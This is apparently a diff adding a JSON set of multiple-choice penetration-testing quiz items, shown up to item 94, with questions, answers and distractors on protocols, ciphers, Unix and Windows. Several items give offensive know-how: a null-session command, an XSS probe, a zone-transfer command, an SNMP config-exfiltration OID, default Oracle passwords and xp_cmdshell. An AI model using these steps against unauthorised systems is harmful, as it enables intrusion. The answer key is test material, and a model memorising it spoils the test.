@@ -1,0 +1,2242 @@
+{
+    "0": {
+        "question": "Why can remote access VPNs not use Main Mode for IKE Phase-1 if the authentication method is pre-shared key?",
+        "answer": "Because pre-shared key authentication with Main Mode requires that the peer's IP is known before the connection is established.",
+        "incorrect": [
+            "Because remote access servers always use aggressive mode for IKE Phase-1.",
+            "Because XAUTH is not compatible with IKE Main Mode.",
+            "Because IKE Main Mode does not support the pre-shared key authentication method.",
+            "Because remote access clients always use aggressive mode for IKE Phase-1."
+        ]
+    },
+    "1": {
+        "question": "What is the blocksize of the DES encryption cipher?",
+        "answer": "64 bits",
+        "incorrect": [
+            "40 bits",
+            "128 bits",
+            "56 bits",
+            "112 bits"
+        ]
+    },
+    "2": {
+        "question": "What is this: 16:23:57.094021 IP 192.168.124.204.137 > 192.168.124.255.137: NBT UDP PACKET(137): QUERY; REQUEST; BROADCAST",
+        "answer": "A NetBIOS over TCP/IP name service broadcast",
+        "incorrect": [
+            "A Spanning Tree Protocol broadcast",
+            "An ARP broadcast",
+            "A NetBIOS over TCP/IP session service broadcast",
+            "A CDP broadcast"
+        ]
+    },
+    "3": {
+        "question": "Which is the least secure encryption cipher of those listed below?",
+        "answer": "DES",
+        "incorrect": [
+            "Triple-DES",
+            "MD5",
+            "AES",
+            "IDEA"
+        ]
+    },
+    "4": {
+        "question": "Which file in a user's home directory controls the trust relationships for Berkeley R services?",
+        "answer": ".rhosts",
+        "incorrect": [
+            "hosts.equiv",
+            "rhosts",
+            "rhosts.allow",
+            "hosts.allow"
+        ]
+    },
+    "5": {
+        "question": "Which operating system is most likely to be vulnerable to the TTYPROMPT vulnerability in the telnet service?",
+        "answer": "Solaris 8",
+        "incorrect": [
+            "Solaris 9",
+            "Linux",
+            "Solaris 10",
+            "FreeBSD"
+        ]
+    },
+    "6": {
+        "question": "Which of the following algorithms could be used to negotiate a shared encryption key?",
+        "answer": "Diffie-Hellman",
+        "incorrect": [
+            "Triple-DES",
+            "SHA1",
+            "DES",
+            "AES"
+        ]
+    },
+    "7": {
+        "question": "Why might a tester insert the string \"<script>alert(\"it works\")</script>\" into a web form?",
+        "answer": "To check for a Cross-Site Scripting vulnerability.",
+        "incorrect": [
+            "To check for a session fixation vulnerability.",
+            "To check for a SQL Injection vulnerability.",
+            "To check for a blind SQL Injection vulnerability.",
+            "To check that the form submission works correctly."
+        ]
+    },
+    "8": {
+        "question": "Which protocols are associated with PPTP?",
+        "answer": "TCP port 1723 and IP protocol 47",
+        "incorrect": [
+            "IP protocol 89",
+            "IP protocol 94",
+            "TCP port 443",
+            "UDP port 500, IP protocol 50 and IP protocol 51"
+        ]
+    },
+    "9": {
+        "question": "Where are the encrypted passwords stored on a Solaris system?",
+        "answer": "/etc/shadow",
+        "incorrect": [
+            "In the TPM chip",
+            "/etc/passwd",
+            "/etc/master.passwd",
+            "/etc/group"
+        ]
+    },
+    "10": {
+        "question": "Which of the following statements about the rwho protocol is true?",
+        "answer": "The rwho daemon sends regular broadcasts to UDP port 513, and listens to broadcasts from other systems.",
+        "incorrect": [
+            "rwho clients can query the rwho daemon. The protocol uses ONC/RPC.",
+            "rwho clients can query the rwho daemon using UDP port 513.",
+            "rwho clients can query the rwho daemon using TCP port 513.",
+            "The rwho daemon sends regular broadcasts to TCP port 513, and listens to broadcasts from other systems."
+        ]
+    },
+    "11": {
+        "question": "How would you establish a null session to a windows host from a windows command shell?",
+        "answer": "NET USE \\\\hostname\\ipc$ \"\" /u:\"\"",
+        "incorrect": [
+            "NET USE \\\\hostname\\c$ \"\" /u:NULL",
+            "NET USE \\\\hostname\\c$ \"\" /u:\"\"",
+            "NET USE \\\\hostname\\ipc$ \"\" /u:NULL",
+            "NET USE \\\\hostname\\ipc$ NULL /u:NULL"
+        ]
+    },
+    "12": {
+        "question": "If the account lockout threshold is set to 5, how many incorrect password attempts will cause the built in administrator account to be locked out on a Windows 2003 system?",
+        "answer": "The built in administrator account will never be locked out.",
+        "incorrect": [
+            "one attempt",
+            "six attempts",
+            "It depends on the account lockout duration setting",
+            "five attempts"
+        ]
+    },
+    "13": {
+        "question": "What effect would an octal umask of 0027 have on the permissions of new files?",
+        "answer": "Remove group write access, and remove all permissions for others.",
+        "incorrect": [
+            "Add SUID, SGID and Sticky bits, add all owner permissions, and add read and execute group access.",
+            "It has no effect on new files because it only affects existing files.",
+            "Add group write access, and add all permissions for others.",
+            "Remove SUID, SGID and Sticky bits, remove all owner permissions, and remove read and execute group access."
+        ]
+    },
+    "14": {
+        "question": "What is the name given to the field concerned with the security implications of electronic eminations from communications equipment?",
+        "answer": "TEMPEST",
+        "incorrect": [
+            "CYCLONE",
+            "TYPHOON",
+            "HURRICANE",
+            "STORM"
+        ]
+    },
+    "15": {
+        "question": "Which of these is not a valid IPv6 address?",
+        "answer": "2001:0db8:1428:57ab",
+        "incorrect": [
+            "2001:db8::1428:57ab",
+            "2001:0db8:0:0:0:0:1428:57ab",
+            "2001:0db8:0000:0000:0000:0000:1428:57ab",
+            "2001:0db8:0:0::1428:57ab"
+        ]
+    },
+    "16": {
+        "question": "You discover an Internet accessible anonymous FTP server on a client's internal network, which is vulnerable to the FTP bounce attack. What is the impact of this vulnerability?",
+        "answer": "Attackers could exploit the vulnerability to port scan other systems on the client's internal network.",
+        "incorrect": [
+            "Attackers could exploit the vulnerability to access any file on the FTP server.",
+            "Attackers could exploit the vulnerability to upload files to the FTP server.",
+            "Attackers could exploit the vulnerability to intercept network traffic on the client's internal network.",
+            "Attackers could exploit the vulnerability to gain administrative access to the FTP server."
+        ]
+    },
+    "17": {
+        "question": "What would you expect the command \"finger 0@hostname\" (that is a zero) against a Solaris 8 system to display?",
+        "answer": "Users with an empty GCOS field in the password file.",
+        "incorrect": [
+            "Users with an empty home directory field in the password file.",
+            "Users with UID 0 in the password file.",
+            "Users with an empty shell field in the password file.",
+            "Users with an empty password field in the password file."
+        ]
+    },
+    "18": {
+        "question": "What are the four potential risk treatments?",
+        "answer": "Avoid, Reduce, Accept and Transfer.",
+        "incorrect": [
+            "Treat, Ignore, Downplay and Optimise.",
+            "Physical, Environmental, Technical and Managerial.",
+            "Best Practice,Standards Based, Regulation and Compliance.",
+            "Theoretical, Practical, Logical and Virtual."
+        ]
+    },
+    "19": {
+        "question": "What does \"export\" signify for an SSL cipher",
+        "answer": "It is a weak cipher that was acceptable for export under the old US cryptography export regulations",
+        "incorrect": [
+            "It is the strongest cipher that is currently permitted to be exported from the US",
+            "It is a cipher with integrated key escrow, which allows the NSA to recover the key",
+            "It is a cipher that is suitable for encrypting information to be sent across national borders",
+            "It is a stronger version of a cipher, similar to export versions of European lagers"
+        ]
+    },
+    "20": {
+        "question": "Which of these protocols is not vulnerable to address spoofing if implemented correctly?",
+        "answer": "TCP",
+        "incorrect": [
+            "UDP",
+            "IP",
+            "Ethernet",
+            "SMTP"
+        ]
+    },
+    "21": {
+        "question": "What effect does setting the RestrictAnonymous registry setting to 1 have on a Windows NT or 2000 system?",
+        "answer": "It prevents enumeration of SAM accounts and names.",
+        "incorrect": [
+            "It remove the \"everyone\" group from the access token for non-authenticated users, preventing most access from null sessions.",
+            "It does not have any effect, because 1 is not a valid setting on NT and 2000.",
+            "It does not have any effect, because 1 is the default setting on NT and 2000.",
+            "It prevents RID cycling."
+        ]
+    },
+    "22": {
+        "question": "What command would you use to list the installed packages on a Solaris system?",
+        "answer": "pkginfo",
+        "incorrect": [
+            "rpm -qa",
+            "cat /proc/sys/packages",
+            "pkg_info",
+            "dpkg -l"
+        ]
+    },
+    "23": {
+        "question": "Which protocols and ports are used by Telnet, SMTP and Finger?",
+        "answer": "TCP/23, TCP/25 and TCP/79",
+        "incorrect": [
+            "UDP/23, UDP/25 and UDP/79",
+            "TCP/23, TCP/35 and TCP/69",
+            "TCP/23, TCP/25 and TCP/69",
+            "TCP/22, TCP/25 and TCP/79"
+        ]
+    },
+    "24": {
+        "question": "What would an SNMP request to set OID 1.3.6.1.4.1.9.2.1.55.10.0.0.1 to \"file\" on a Cisco router using a community string with read/write access do?",
+        "answer": "Cause the target router to upload its configuration file to the TFTP server at 10.0.0.1 as a file called \"file\"",
+        "incorrect": [
+            "Cause the router at IP address 10.0.0.1 to display its configuration file",
+            "Cause the target router to load its configuration file from NVRAM",
+            "Cause the target router to download the configuration file from the TFTP server at 10.0.0.1 from a file called \"file\"",
+            "Cause the target router to write its configuration file to NVRAM"
+        ]
+    },
+    "25": {
+        "question": "What RPC authentication mechanism does NFS v2 and v3 use?",
+        "answer": "AUTH_SYS, using Unix UID and GID",
+        "incorrect": [
+            "Kerberos",
+            "AUTH_NONE, no authentication",
+            "RPCSEC_GSS, Generic security services",
+            "AUTH_DH, Diffie-Hellman authentication"
+        ]
+    },
+    "26": {
+        "question": "Which of these statements about the Windows built in administrator account is correct?",
+        "answer": "It always has RID 500",
+        "incorrect": [
+            "It is always named \"Administrator\"",
+            "It is the only member of the \"Administrators\" group",
+            "It cannot be renamed",
+            "It always has SID 500"
+        ]
+    },
+    "27": {
+        "question": "What does the \"Root Squash\" option on an NFS export do?",
+        "answer": "Makes the root user on the NFS client access files as nobody on the server.",
+        "incorrect": [
+            "Makes all users on the NFS client access files as root on the server.",
+            "Prevents any access by the root user on the NFS client.",
+            "Allows the root user on the NFS client to access files as root on the server.",
+            "Prevents the use of SUID files that are owned by root on the NFS server."
+        ]
+    },
+    "28": {
+        "question": "With blind SQL injection, the results of the injection are not visible, and no errors are displayed. How can blind SQL injection be detected?",
+        "answer": "The web server behaviour changes when a successful injection is performed.",
+        "incorrect": [
+            "By sniffing the packets travelling between the browser and the web server.",
+            "The results are encoded in the HTTP headers returned by the server.",
+            "The attacker can only detect blind SQL injection by gaining physical access to the web server.",
+            "By observing the HTTP response code sent by the server."
+        ]
+    },
+    "29": {
+        "question": "What does the phrase \"Inherent Risk\" mean in risk management?",
+        "answer": "A risk that is implicitly associated with an activity or location.",
+        "incorrect": [
+            "A risk that doesn't really matter.",
+            "A risk that no one knows what to do about.",
+            "A material misstatement relating to an assertion.",
+            "A very serious risk."
+        ]
+    },
+    "30": {
+        "question": "Which of the following cipher modes use a block cipher to generate a key stream that can be used as a stream cipher?",
+        "answer": "CFB",
+        "incorrect": [
+            "ECB",
+            "CBC",
+            "EDE",
+            "ABC"
+        ]
+    },
+    "31": {
+        "question": "What is the digest length for the SHA1 hash function?",
+        "answer": "160 bits",
+        "incorrect": [
+            "192 bits",
+            "128 bits",
+            "56 bits",
+            "256 bits"
+        ]
+    },
+    "32": {
+        "question": "What is the default password for the DBSNMP user on Oracle 9i?",
+        "answer": "DBSNMP",
+        "incorrect": [
+            "blank",
+            "MANAGER",
+            "SYSADM",
+            "CHANGE_ON_INSTALL"
+        ]
+    },
+    "33": {
+        "question": "Which of these groups of tools are commonly used for packet crafting?",
+        "answer": "hping2, hping3 and scapy",
+        "incorrect": [
+            "wireshark, tcpdump and dsniff",
+            "john, cain & able and l0phtcrack",
+            "nmap, superscan and angry IP scanner",
+            "kismet, netstumbler and aircrack"
+        ]
+    },
+    "34": {
+        "question": "The active directory database file is:",
+        "answer": "NTDS.DIT",
+        "incorrect": [
+            "NTDS.DAT",
+            "NTDS.MDB",
+            "MSAD.DIT",
+            "MDAD.MDB"
+        ]
+    },
+    "35": {
+        "question": "Which nmap flag enables OS TCP/IP stack fingerprinting?",
+        "answer": "-O",
+        "incorrect": [
+            "-sS",
+            "-v",
+            "-n",
+            "-P0"
+        ]
+    },
+    "36": {
+        "question": "Which of the following is NOT an EAP method?",
+        "answer": "EAP-RSA",
+        "incorrect": [
+            "EAP-PSK",
+            "EAP-TTLS",
+            "EAP-TLS",
+            "EAP-MD5"
+        ]
+    },
+    "37": {
+        "question": "What is the significance of the string \"SEP\" in the configuration filename of a Cisco IP phone?",
+        "answer": "It stands for Selsius Ethernet Phone, which was the original name of the Cisco IP phone.",
+        "incorrect": [
+            "It stands for Skinny Enchanced Phone.",
+            "It stands for Cisco Ethernet Phone, but someone misspelled it and the name stuck.",
+            "It stands for SIP Enhanced Phone.",
+            "No one knows."
+        ]
+    },
+    "38": {
+        "question": "Which of these is an IP option?",
+        "answer": "Record Route",
+        "incorrect": [
+            "Timestamp",
+            "Maximum Segment Size",
+            "Window Scale",
+            "SACK"
+        ]
+    },
+    "39": {
+        "question": "Which of the following are all ONC/RPC services?",
+        "answer": "cmsd, kcms_server, sadmind, snmpXdmid",
+        "incorrect": [
+            "telnet, ssh, ftp, http",
+            "rusersd, rstatd, sprayd, rexec",
+            "rexec, rlogin, rsh, rsync",
+            "ntp, nfs, netbios, nntp"
+        ]
+    },
+    "40": {
+        "question": "When was the Apache chunked encoding vulnerability fixed in version 1.3?",
+        "answer": "1.3.26",
+        "incorrect": [
+            "1.3.1",
+            "1.3.42",
+            "1.3.24",
+            "1.3.20"
+        ]
+    },
+    "41": {
+        "question": "An accepted limitation of Diffie-Hellman key agreement protocol is",
+        "answer": "It is vulnerable to a man-in-the-middle attack",
+        "incorrect": [
+            "It is vital to keep the shared prime secret",
+            "It is possible for one of the peers to control the generated secret",
+            "It can only generate encryption keys up to 128 bits",
+            "An attacker who can monitor the exchange can determine the shared secret"
+        ]
+    },
+    "42": {
+        "question": "What are the privileged TCP and UDP ports, which only a privileged user can listen on?",
+        "answer": "0-1023 inclusive",
+        "incorrect": [
+            "1024-65535 inclusive",
+            "0-1024 inclusive",
+            "32768-65535 inclusive",
+            "0-65535 inclusive"
+        ]
+    },
+    "43": {
+        "question": "What attack can be used to force some switches to forward frames to all ports?",
+        "answer": "MAC flooding",
+        "incorrect": [
+            "IP fragmentation",
+            "LAND attack",
+            "ARP spoofing or ARP poisoning",
+            "VLAN hopping"
+        ]
+    },
+    "44": {
+        "question": "Which of the following protocols is the most secure?",
+        "answer": "WPA with CCMP (AES)",
+        "incorrect": [
+            "WEP",
+            "WEP2",
+            "WPA with TKIP (RC4)",
+            "WEPplus"
+        ]
+    },
+    "45": {
+        "question": "What command would you use to display the version number of a Microsoft SQL Server database if you are connected with a command line client?",
+        "answer": "select @@version;",
+        "incorrect": [
+            "select version();",
+            "display version;",
+            "get version;",
+            "show version;"
+        ]
+    },
+    "46": {
+        "question": "A web server returns \"Server: Microsoft-IIS/5.0\" in the HTTP headers. What operating system is it probably using?",
+        "answer": "Windows 2000 Server",
+        "incorrect": [
+            "Windows NT4 Server",
+            "Windows 2003 Server",
+            "Windows XP",
+            "Windows 2008 Server"
+        ]
+    },
+    "47": {
+        "question": "Some older TCP implementations are vulnerable to a DoS attack that exploits the small queue for connections in progress?",
+        "answer": "SYN flood",
+        "incorrect": [
+            "Predictable Initial Sequence Numbers",
+            "SMURF Attack",
+            "Teardrop Attack",
+            "LAND Attack"
+        ]
+    },
+    "48": {
+        "question": "What is the function of the /etc/ftpusers file on a Unix FTP server?",
+        "answer": "It lists the users that are NOT permitted to use the FTP server.",
+        "incorrect": [
+            "It is not used for anything.",
+            "It lists IP addresses that users can connect to the FTP server from.",
+            "It lists the users that are permitted to use the FTP server.",
+            "It selects the authentication mechanism for the FTP server."
+        ]
+    },
+    "49": {
+        "question": "In active directory, what does FSMO (pronounced \"Fizz-Mo\") stand for?",
+        "answer": "Flexible Single Master Operations",
+        "incorrect": [
+            "Fixed Single Master Operations",
+            "Flexible Security Master Operations",
+            "Forest Single Master Operations",
+            "Forest Security Master Operations"
+        ]
+    },
+    "50": {
+        "question": "What TCP port does Microsoft SQL Server listen on in hidden mode?",
+        "answer": "2433",
+        "incorrect": [
+            "3306",
+            "1434",
+            "1521",
+            "1433"
+        ]
+    },
+    "51": {
+        "question": "During a penetration test, you gain access to a database containing personal details of staff. What is the best course of action?",
+        "answer": "Note the issue but do not store any of the personal data on your system.",
+        "incorrect": [
+            "Publish the information in a case study.",
+            "Change the database settings to address the vulnerability.",
+            "Drop the database so hackers cannot access this data.",
+            "Take a copy of the database so you can use it in your report."
+        ]
+    },
+    "52": {
+        "question": "When should the scope of work be defined?",
+        "answer": "Before testing is started.",
+        "incorrect": [
+            "After testing is completed, but before the report is written.",
+            "As soon as possible after testing is started.",
+            "During testing, based on the results from the port scan.",
+            "The scoping is optional, and may be omitted if the client agrees."
+        ]
+    },
+    "53": {
+        "question": "Which of these techniques is commonly implemented in modern C compilers to prevent buffer overflow exploitation?",
+        "answer": "Canary values",
+        "incorrect": [
+            "Loop unrolling",
+            "Register optimisation",
+            "Stack alignment",
+            "Inline functions"
+        ]
+    },
+    "54": {
+        "question": "Which of the following encryption algorithms is an asymmetric cipher?",
+        "answer": "RSA",
+        "incorrect": [
+            "DES",
+            "3DES",
+            "AES",
+            "RC5"
+        ]
+    },
+    "55": {
+        "question": "What are the valid key lengths for the AES encryption cipher?",
+        "answer": "128, 192 and 256",
+        "incorrect": [
+            "128 and 256",
+            "56, 112 and 168",
+            "64, 128 and 256",
+            "128, 160 and 256"
+        ]
+    },
+    "56": {
+        "question": "Which are the six base SIP methods?",
+        "answer": "REGISTER, INVITE, ACK, CANCEL, BYE, OPTIONS",
+        "incorrect": [
+            "REGISTER, UNREGISTER, ACK, NAK, HELLO, BYE",
+            "REGISTER, ASSOCIATE, DISASSOCIATE, CANCEL, BYE, OPTIONS",
+            "REGISTER, INVITE, ACK, HELLO, BYE, OPTIONS",
+            "GET, POST, HEAD, OPTIONS, TRACE, CONNECT"
+        ]
+    },
+    "57": {
+        "question": "Which scan would be most likely to discover a firewall that blocks all traffic to itself from the interface connected to the network you are scanning from?",
+        "answer": "ARP scan",
+        "incorrect": [
+            "UDP port scan",
+            "Ping sweep",
+            "SNMP query",
+            "TCP port scan"
+        ]
+    },
+    "58": {
+        "question": "You find a system that is offering the NFS RPC service. What is the logical next step?",
+        "answer": "Run \"showmount -e\" to list the NFS exports.",
+        "incorrect": [
+            "Report it as a vulnerability.",
+            "Try to find a buffer overflow vulnerability in the NFS service.",
+            "Leave it and move on because there are no known vulnerabilities in NFS.",
+            "Try to mount an exported filesystem."
+        ]
+    },
+    "59": {
+        "question": "What is this: password 7 052D131D33556C081D021200",
+        "answer": "A password encoded with the reversible Cisco vigenere algorithm",
+        "incorrect": [
+            "A password encoded with Unix crypt",
+            "A password encoded with unsalted DES",
+            "A password encoded with salted MD5",
+            "A password with the literal value \"052D131D33556C081D021200\""
+        ]
+    },
+    "60": {
+        "question": "What identifies the superuser on a Unix or Linux system?",
+        "answer": "Any user with UID 0 (zero) in the password file.",
+        "incorrect": [
+            "Any user with UID 65535 in the password file.",
+            "Anyone who logs on at the system console.",
+            "Any user that belongs to the \"root\" group in the group file.",
+            "The user with the username \"root\" in the password file."
+        ]
+    },
+    "61": {
+        "question": "Which command will retrieve the version number from default installations of the BIND nameserver software?",
+        "answer": "dig @nameserver version.bind txt chaos",
+        "incorrect": [
+            "dig @nameserver nameserver.version txt chaos",
+            "dig @nameserver version.bind hinfo chaos",
+            "dig @nameserver bind.version txt chaos",
+            "dig @nameserver bind-version txt chaos"
+        ]
+    },
+    "62": {
+        "question": "The UK Government protective marking levels are, from lowest to highest protection:",
+        "answer": "NPM, PROTECT, RESTRICTED, CONFIDENTIAL, SECRET, TOP SECRET.",
+        "incorrect": [
+            "TOP SECRET, SECRET, CONFIDENTIAL, RESTRICTED.",
+            "CONFIDENTIAL, SECRET, TOP SECRET.",
+            "NPM, RESTRICTED, PROTECT, CONFIDENTIAL, SECRET, TOP SECRET.",
+            "CLASSIFIED, INTERNAL USE ONLY, SECRET, TOP SECRET."
+        ]
+    },
+    "63": {
+        "question": "What are the SIP and RTP protocols used for in VoIP?",
+        "answer": "SIP is used for setting up and closing down calls, and RTP is used for audio data transmission.",
+        "incorrect": [
+            "SIP and RTP are competing protocols that are both used for setting up and tearing down calls.",
+            "SIP is used for setting up and closing down calls, but RTP is nothing to do with VoIP.",
+            "RTP is used for setting up and closing down calls, and SIP is used for audio data transmission.",
+            "SIP and RTP are competing protocols that are both used for audio data transmission."
+        ]
+    },
+    "64": {
+        "question": "What is the primary legal reason for obtaining written permission before starting a test?",
+        "answer": "Because otherwise the penetration test might breach the Computer Misuse Act.",
+        "incorrect": [
+            "Because otherwise the penetration test might breach the Human Rights Act.",
+            "Because otherwise the penetration test might breach the Data Protection Act.",
+            "There are no legal reasons, only commercial reasons.",
+            "Because otherwise the client might not pay for the work."
+        ]
+    },
+    "65": {
+        "question": "Which of the following statements about the time protocols \"time\", \"daytime\" and \"NTP\" are correct?",
+        "answer": "\"time\" represents the time as a 32-bit value, \"daytime\" uses an ASCII string, and \"NTP\" uses a 64-bit value.",
+        "incorrect": [
+            "\"time\" represents the time as a 32-bit value, \"daytime\" uses a 64-bit value, and \"NTP\" uses an ASCII string.",
+            "\"time\" represents the time as a 64-bit value, \"daytime\" uses an ASCII string, and \"NTP\" uses a 32-bit value.",
+            "\"time\" represents the time as an ASCII string, \"daytime\" uses a 32-bit value, and \"NTP\" uses a 64-bit value.",
+            "\"time\" represents the time as an ASCII string, \"daytime\" uses a 64-bit value, and \"NTP\" uses a 32-bit value."
+        ]
+    },
+    "66": {
+        "question": "Which of these is not a valid IP address?",
+        "answer": "192.168.300.1",
+        "incorrect": [
+            "10.0.0.1",
+            "172.16.3.7",
+            "195.32.67.14",
+            "192.168.0.1"
+        ]
+    },
+    "67": {
+        "question": "What command would you use to list the installed patches on a Solaris system?",
+        "answer": "showrev -a or showrev -p",
+        "incorrect": [
+            "patchlist or pkglist",
+            "cat /etc/patchlist",
+            "pkginfo",
+            "pkg_info"
+        ]
+    },
+    "68": {
+        "question": "On a Unix system, what is the effect of the execute bit on a directory?",
+        "answer": "It allows the directory to be traversed.",
+        "incorrect": [
+            "It allows all files in the directory to be executed.",
+            "It allows the directory to be executed.",
+            "It depends on the version of Unix that is being used.",
+            "It has no effect."
+        ]
+    },
+    "69": {
+        "question": "What is this: 17:58:01.396446 CDPv2, ttl: 180s, Device-ID 'chestnut.nta-monitor.com', length 404",
+        "answer": "A CDP broadcast",
+        "incorrect": [
+            "A NetBIOS over TCP/IP session service broadcast",
+            "A NetBIOS over TCP/IP name service broadcast",
+            "An ARP broadcast",
+            "A Spanning Tree Protocol broadcast"
+        ]
+    },
+    "70": {
+        "question": "What are the four mandatory transform attributes for an IKE Phase-1 SA?",
+        "answer": "Encryption Algorithm, Hash Algorithm, Authentication Method, Diffie Hellman Group",
+        "incorrect": [
+            "Protocol ID, Transform ID, IPsec Mode, Authentication Algorithm",
+            "SA Lifetime, Hash Algorithm, Authentication Method, PRF",
+            "Encryption Algorithm, Key Length, Authentication Method, SA Lifetime",
+            "SA Lifetime, Key length, PRF, Field Size"
+        ]
+    },
+    "71": {
+        "question": "What command would you use to list the installed packages on a Redhat or Fedora system?",
+        "answer": "rpm -qa",
+        "incorrect": [
+            "pkginfo",
+            "cat /proc/sys/packages",
+            "pkg_info",
+            "dpkg -l"
+        ]
+    },
+    "72": {
+        "question": "Where are the encrypted passwords stored on a FreeBSD system?",
+        "answer": "/etc/master.passwd",
+        "incorrect": [
+            "/etc/shadow",
+            "/etc/group",
+            "In the TPM chip",
+            "/etc/passwd"
+        ]
+    },
+    "73": {
+        "question": "You discover a vulnerability on an Internet accessible web server which allows you to execute commands as a non-privileged user. The web server is behind a firewall that allows only TCP port 80 inbound and permits all outbound traffic. What technique could be used to get shell access to the webserver?",
+        "answer": "Run a shell on the webserver and connect its control channel back to a TCP port on your local system.",
+        "incorrect": [
+            "It is not possible to obtain shell access in these circumstances.",
+            "Run a shell on the webserver with its control channel listening on a high TCP port.",
+            "Run a shell on the webserver with its control channel listening on TCP port 81.",
+            "Run a shell on the webserver with its control channel listening on TCP port 80."
+        ]
+    },
+    "74": {
+        "question": "If you find TCP port 111 open on a Unix system, what is the next logical step to take?",
+        "answer": "Run \"rpcinfo -p\" to enumerate the RPC services.",
+        "incorrect": [
+            "Telnet to the port to look for a banner.",
+            "Report it as a vulnerability.",
+            "Telnet to the port, send \"GET / HTTP/1.0\" and gather information from the response.",
+            "Run amap against it to determine what service is running on that port."
+        ]
+    },
+    "75": {
+        "question": "Which protocol and port does a normal DNS lookup use?",
+        "answer": "UDP port 53",
+        "incorrect": [
+            "UDP port 43",
+            "TCP port 45",
+            "TCP port 43",
+            "TCP port 53"
+        ]
+    },
+    "76": {
+        "question": "Which of the following web application technologies would you expect to be most secure?",
+        "answer": "A pure Java application",
+        "incorrect": [
+            "A PHP4 application",
+            "A Perl application running under MOD-Perl",
+            "A Perl application running as CGI scripts",
+            "A PHP3 application"
+        ]
+    },
+    "77": {
+        "question": "Which nmap command performs a half-open or \"SYN\" TCP portscan?",
+        "answer": "nmap -n -P0 -v -sS -p1-1024 hostname",
+        "incorrect": [
+            "nmap -n -P0 -v -sN -p1-1024 hostname",
+            "nmap -n -P0 -v -sF -p1-1024 hostname",
+            "nmap -n -P0 -v -sA -p1-1024 hostname",
+            "nmap -n -P0 -v -sT -p1-1024 hostname"
+        ]
+    },
+    "78": {
+        "question": "Which command will perform a DNS zone transfer of the domain \"company.com\" from the nameserver at 10.0.0.1?",
+        "answer": "dig @10.0.0.1 company.com axfr",
+        "incorrect": [
+            "dig @10.0.0.1 company.com zone-transfer",
+            "dig @10.0.0.1 company.com.zone",
+            "dig @10.0.0.1 company.com ls",
+            "dig @10.0.0.1 company.com any"
+        ]
+    },
+    "79": {
+        "question": "What is this: 17:57:57.850175 802.1d config 8064.00:0c:85:f1:3f:80.8010 root 8064.00:0b:46:48:29:80 pathcost 19 age 1 max 20 hello 2 fdelay 15",
+        "answer": "A Spanning Tree Protocol broadcast",
+        "incorrect": [
+            "A NetBIOS over TCP/IP name service broadcast",
+            "A NetBIOS over TCP/IP session service broadcast",
+            "An ARP broadcast",
+            "A CDP broadcast"
+        ]
+    },
+    "80": {
+        "question": "Which of these is not an ICMP message type?",
+        "answer": "Host unreachable",
+        "incorrect": [
+            "Router Solicitation",
+            "Echo request",
+            "Echo reply",
+            "Source Quench"
+        ]
+    },
+    "81": {
+        "question": "What version of NFS includes strong security, including strong authentication and encryption?",
+        "answer": "version 4",
+        "incorrect": [
+            "version 3",
+            "version 2",
+            "version 5",
+            "version 1"
+        ]
+    },
+    "82": {
+        "question": "The DNS entries for www.customer.com and www.example.com both point to the same IP address. How does the web server know which domain is being requested by the browser?",
+        "answer": "It uses the HTTP Host: header.",
+        "incorrect": [
+            "It inspects the cookies sent by the client.",
+            "Both websites must have the same content.",
+            "It inspects the client's SSL certificate.",
+            "It uses a reverse DNS lookup of the client's IP address."
+        ]
+    },
+    "83": {
+        "question": "If an attacker gained access to a Microsoft SQL server using the \"sa\" account, which stored procedure would he use to add a user account?",
+        "answer": "xp_cmdshell",
+        "incorrect": [
+            "xp_adduser",
+            "xp_commandshell",
+            "sp_cmdshell",
+            "sp_commandshell"
+        ]
+    },
+    "84": {
+        "question": "Which of these is an Ethernet multicast MAC address?",
+        "answer": "01:00:0c:cc:cc:cc",
+        "incorrect": [
+            "00-10-db-74-d0-52",
+            "000b.dbb2.fa60",
+            "00:10:db:74:d0:52",
+            "00:10:DB:74:D0:52"
+        ]
+    },
+    "85": {
+        "question": "What technique forwards traffic to an attacker's system by associating the attacker's MAC address with the IP address of the target system?",
+        "answer": "ARP spoofing or ARP poisoning",
+        "incorrect": [
+            "SMURF attack",
+            "Teardrop attack",
+            "LAND attack",
+            "ARP flooding"
+        ]
+    },
+    "86": {
+        "question": "Which of these methods is the best way to determine if a remote host is running an X Window server that allows remote connections from the local host?",
+        "answer": "Run \"xdpyinfo -display remotehost:0.0\"",
+        "incorrect": [
+            "Check to see if UDP port 177 is open",
+            "Check to see if TCP port 6000 is open",
+            "Check to see if TCP port 6001 is open",
+            "Run \"xterm -display remotehost:0.0\""
+        ]
+    },
+    "87": {
+        "question": "What is the default password for the SYS user on Oracle 9i and 10g?",
+        "answer": "CHANGE_ON_INSTALL",
+        "incorrect": [
+            "DBSNMP",
+            "There is no default",
+            "SYSADM",
+            "MANAGER"
+        ]
+    },
+    "88": {
+        "question": "UDP port 1434 is commonly used by which database?",
+        "answer": "Microsoft SQL Server",
+        "incorrect": [
+            "Oracle 9i",
+            "MySQL",
+            "Postgres",
+            "DB2"
+        ]
+    },
+    "89": {
+        "question": "AJAX is",
+        "answer": "Asynchronous Javascript and XML",
+        "incorrect": [
+            "Automatic Java and XML",
+            "Apache Javascript and XML",
+            "A household cleaner",
+            "A Dutch football team"
+        ]
+    },
+    "90": {
+        "question": "You connect to TCP port 22 on a target system and receive the banner \"SSH-1.99-OpenSSH_3.9p1\". Which of the following statements about this system are true?",
+        "answer": "It is an SSH server, and supports SSH version 1 and version 2.",
+        "incorrect": [
+            "It is an SSH server, and supports SSH version 1 only.",
+            "It is an SSH server, and supports SSH version 2 only.",
+            "It is an SSH server, and only allows connections from an OpenSSH client.",
+            "It is an SSH server, and supports SSH version 1.99."
+        ]
+    },
+    "91": {
+        "question": "What are the three main pieces of legislation that are relevant to penetration testing in the UK?",
+        "answer": "The Computer Misuse Act, The Human Rights Act and The Data Protection Act.",
+        "incorrect": [
+            "The Freedom of Information Act, The Data Protection Act and The Terrorism Act.",
+            "The Terrorism Act, The Freedom of Information Act and The Computer Misuse Act.",
+            "The Food Standards Act, The Misuse of Drugs Act and The Breeding and Sale of Dogs Act.",
+            "The Rehabilitation of Offenders Act, The Employment Relations Act and The Human Rights Act."
+        ]
+    },
+    "92": {
+        "question": "What is the OUI part of the Ethernet MAC address 00:0B:46:48:29:80?",
+        "answer": "00:0B:46",
+        "incorrect": [
+            "00:0B",
+            "00:0b:46:48:29",
+            "00:0b:46:48",
+            "00"
+        ]
+    },
+    "93": {
+        "question": "What is the name of the database administrator account on Microsoft SQL server?",
+        "answer": "sa",
+        "incorrect": [
+            "dbo",
+            "root",
+            "administrator",
+            "admin"
+        ]
+    },
+    "94": {
